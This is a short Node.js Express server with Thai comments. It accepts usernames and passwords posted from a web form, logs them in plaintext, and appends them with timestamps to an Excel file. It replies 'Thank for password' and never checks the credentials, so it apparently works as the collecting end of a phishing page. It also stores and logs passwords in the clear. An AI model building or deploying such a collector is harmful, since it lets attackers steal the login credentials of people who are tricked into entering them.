const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const ExcelJS = require('exceljs');

const app = express();
app.use(bodyParser.json());
app.use(express.static('public')); // ให้เซิร์ฟไฟล์ HTML, CSS, JS จากโฟลเดอร์ public

// ฟังก์ชันเพิ่มข้อมูลลงในไฟล์ Excel
async function addDataToExcel(data) {
    const filePath = './data.xlsx'; // ตำแหน่งไฟล์ Excel

    try {
        const workbook = new ExcelJS.Workbook();

        // โหลดไฟล์ Excel ถ้ามีอยู่
        if (fs.existsSync(filePath)) {
            console.log('Loading existing Excel file...');
            await workbook.xlsx.readFile(filePath);
        } else {
            console.log('Creating new Excel file...');
        }

        // สร้าง Worksheet
        let worksheet = workbook.getWorksheet('Sheet1');
        if (!worksheet) {
            console.log('Creating new worksheet with headers...');
            worksheet = workbook.addWorksheet('Sheet1');
            worksheet.columns = [
                { header: 'Username', key: 'username', width: 20 },
                { header: 'Password', key: 'password', width: 20 },
                { header: 'Timestamp', key: 'timestamp', width: 30 },
            ];
        }

        
        const nextRow = worksheet.lastRow ? worksheet.lastRow.number + 1 : 2; 
        console.log(`Adding data to row: ${nextRow}`);

        
        const row = worksheet.getRow(nextRow);
        row.getCell(1).value = data.username; 
        row.getCell(2).value = data.password; 
        row.getCell(3).value = new Date().toISOString(); 
        row.commit(); 

        console.log('Row added successfully.');

        // บันทึกไฟล์ Excel
        await workbook.xlsx.writeFile(filePath);
        console.log('File saved successfully.');
    } catch (error) {
        console.error('Error processing Excel file:', error);
        throw error;
    }
}



// API สำหรับรับข้อมูลจากฟอร์ม
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;

    try {
        console.log('Received data:', { username, password });
        await addDataToExcel({ username, password });
        res.status(200).send('Thank for password');
    } catch (error) {
        console.error('Error saving data to Excel:', error);
        res.status(500).send('Error saving data to Excel');
    }
});

// เริ่มเซิร์ฟเวอร์
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running and accessible on http://0.0.0.0:${PORT}`);
});
// app.listen(3000, () => {
//     console.log('Server is running on http://localhost:3000');
// });
